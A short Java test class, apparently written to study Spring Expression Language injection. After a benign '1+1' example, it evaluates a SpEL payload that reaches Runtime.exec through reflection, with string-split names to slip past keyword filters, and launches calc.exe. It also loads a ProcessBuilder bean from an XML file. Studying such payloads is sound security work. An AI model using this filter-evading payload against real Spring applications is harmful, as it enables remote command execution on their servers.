package org.test.DynamicFeature.Expresstion.SpEL;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class testSpEL {
    public static void main(String[] args) {
        String el = "1+1";
        //创建ExpressionParser解析表达式
        ExpressionParser parser = new SpelExpressionParser();
        //SpEL表达式语法设置在parseExpression()入参内
        Expression exp = parser.parseExpression(el);
        //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext
        Object value = exp.getValue();
        System.out.println(value.toString());

        //命令执行
        el = "T(Runtime).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"calc.exe\"})";
        exp = parser.parseExpression(el);
        value = exp.getValue();

        //SpEL引用Bean
        ApplicationContext context = new ClassPathXmlApplicationContext("org/test/DynamicFeature/JsonSerialize/Jackson/spel.xml");
        ProcessBuilder pb = (ProcessBuilder)context.getBean("pb");
    }
}
